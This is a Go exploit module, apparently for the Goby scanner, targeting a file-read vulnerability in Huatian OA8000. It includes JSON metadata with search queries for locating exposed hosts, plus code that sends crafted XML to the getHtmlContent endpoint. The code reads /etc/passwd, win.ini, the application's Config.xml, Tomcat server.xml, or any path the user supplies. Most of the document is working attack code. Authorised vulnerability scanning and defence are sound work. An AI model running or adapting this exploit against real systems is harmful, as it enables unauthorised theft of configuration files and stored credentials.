package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"html"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Huatian Power OA getHtmlContent file reading vulnerability",
    "Description": "<p>Huatian Dynamics collaborative office system combines advanced management ideas, management models, software technology, and network technology to provide users with a low-cost, high-efficiency collaborative office and management platform. By using the Huatian Dynamics collaborative office platform, wise managers have achieved good results in strengthening standardized work processes, strengthening team execution, promoting refined management, and promoting business growth.</p><p>Huatian Dynamics collaborative office system has a file reading vulnerability. An attacker can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely unsafe state.</p>",
    "Product": "Huatian-OA8000",
    "Homepage": "http://www.oa8000.com",
    "DisclosureDate": "2022-11-28",
    "Author": "1angx",
    "FofaQuery": "body=\"/OAapp/WebObjects/OAapp.woa\" || body=\"/OAapp/htpages/app\"",
    "GobyQuery": "body=\"/OAapp/WebObjects/OAapp.woa\" || body=\"/OAapp/htpages/app\"",
    "Level": "2",
    "Impact": "<p>Huatian Dynamics collaborative office system has a file reading vulnerability. An attacker can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely unsafe state.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.oa8000.com\">http://www.oa8000.com</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "server,config,custom",
            "show": ""
        },
        {
            "name": "filePath",
            "type": "input",
            "value": "c:\\windows\\win.ini",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read",
        "Information technology application innovation industry"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "华天动力 OA getHtmlContent 文件读取漏洞",
            "Product": "华天动力-OA8000",
            "Description": "<p>华天动力协同办公系统将先进的管理思想、管理模式和软件技术、网络技术相结合，为用户提供了低成本、高效能的协同办公和管理平台。睿智的管理者通过使用华天动力协同办公平台，在加强规范工作流程、强化团队执行、推动精细管理、促进营业增长等工作中取得了良好的成效。</p><p>华天动力协同办公系统存在文件读取漏洞，攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。</p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.oa8000.com\">http://www.oa8000.com</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>华天动力协同办公系统存在文件读取漏洞，攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "信创"
            ]
        },
        "EN": {
            "Name": "Huatian Power OA getHtmlContent file reading vulnerability",
            "Product": "Huatian-OA8000",
            "Description": "<p>Huatian Dynamics collaborative office system combines advanced management ideas, management models, software technology, and network technology to provide users with a low-cost, high-efficiency collaborative office and management platform. By using the Huatian Dynamics collaborative office platform, wise managers have achieved good results in strengthening standardized work processes, strengthening team execution, promoting refined management, and promoting business growth.</p><p>Huatian Dynamics collaborative office system has a file reading vulnerability. An attacker can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely unsafe state.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.oa8000.com\">http://www.oa8000.com</a><br></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Huatian Dynamics collaborative office system has a file reading vulnerability. An attacker can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely unsafe state.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "Information technology application innovation industry"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-07-29",
    "PocId": "10755"
}`
	readFile73FY93GsvcRdb := func(hostInfo *httpclient.FixUrl, filePath string) (*httpclient.HttpResponse, error) {
		readConfig := httpclient.NewPostRequestConfig("/OAapp/bfapp/buffalo/TemplateService")
		readConfig.VerifyTls = false
		readConfig.FollowRedirect = false
		readConfig.Header.Store("Content-Type", "text/xml")
		readConfig.Data = "<buffalo-call>\n<method>getHtmlContent</method>\n<string>" + filePath + "</string>\n</buffalo-call>"
		return httpclient.DoHttpRequest(hostInfo, readConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			// 必须是绝对路径，mac/Linux系统没有固定的安装路径。 windows有一个系统推荐路径，但是盘符不确定。所以不读取web.xml，读取路径确定的系统文件
			var result bool
			for _, path := range []string{"C:\\windows\\win.ini", "C:\\windows\\system.ini", "/etc/passwd"} {
				resp, _ := readFile73FY93GsvcRdb(hostInfo, path)
				if resp != nil && resp.StatusCode == 200 && ((strings.Contains(resp.Utf8Html, "root") && strings.Contains(resp.Utf8Html, "bin")) || (strings.Contains(resp.Utf8Html, "app support") && strings.Contains(resp.Utf8Html, "mci"))) {
					result = true
					break
				}
			}
			return result
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "config" {
				for _, path := range []string{"C:\\Program Files (x86)\\htoa\\OAapp\\OAapp.woa\\Contents\\Resources\\Config.xml", "C:\\htoa\\OAapp\\OAapp.woa\\Contents\\Resources\\Config.xml", "D:\\htoa\\OAapp\\OAapp.woa\\Contents\\Resources\\Config.xml", "E:\\htoa\\OAapp\\OAapp.woa\\Contents\\Resources\\Config.xml"} {
					resp, err := readFile73FY93GsvcRdb(expResult.HostInfo, path)
					if err != nil {
						expResult.Output = err.Error()
						return expResult
					} else if resp != nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "Config") {
						expResult.Success = true
						expResult.Output = html.UnescapeString(resp.Utf8Html)
						return expResult
					} else {
						expResult.Output = "漏洞利用失败"
					}
				}
			} else if attackType == "server" {
				for _, path := range []string{"C:\\Program Files (x86)\\htoa\\Tomcat\\conf\\server.xml", "C:\\htoa\\Tomcat\\conf\\server.xml", "D:\\htoa\\Tomcat\\conf\\server.xml", "E:\\htoa\\Tomcat\\conf\\server.xml"} {
					resp, err := readFile73FY93GsvcRdb(expResult.HostInfo, path)
					if err != nil {
						expResult.Output = err.Error()
						return expResult
					} else if resp != nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "Server") {
						expResult.Success = true
						expResult.Output = html.UnescapeString(resp.Utf8Html)
						return expResult
					} else {
						expResult.Output = "漏洞利用失败"
					}
				}
			} else if attackType == "custom" {
				filePath := goutils.B2S(stepLogs.Params["filePath"])
				custom, err := readFile73FY93GsvcRdb(expResult.HostInfo, filePath)
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				} else if custom != nil && custom.StatusCode == 200 {
					expResult.Success = true
					expResult.Output = html.UnescapeString(custom.Utf8Html)
					return expResult
				} else {
					expResult.Output = "漏洞利用失败"
				}
			} else {
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
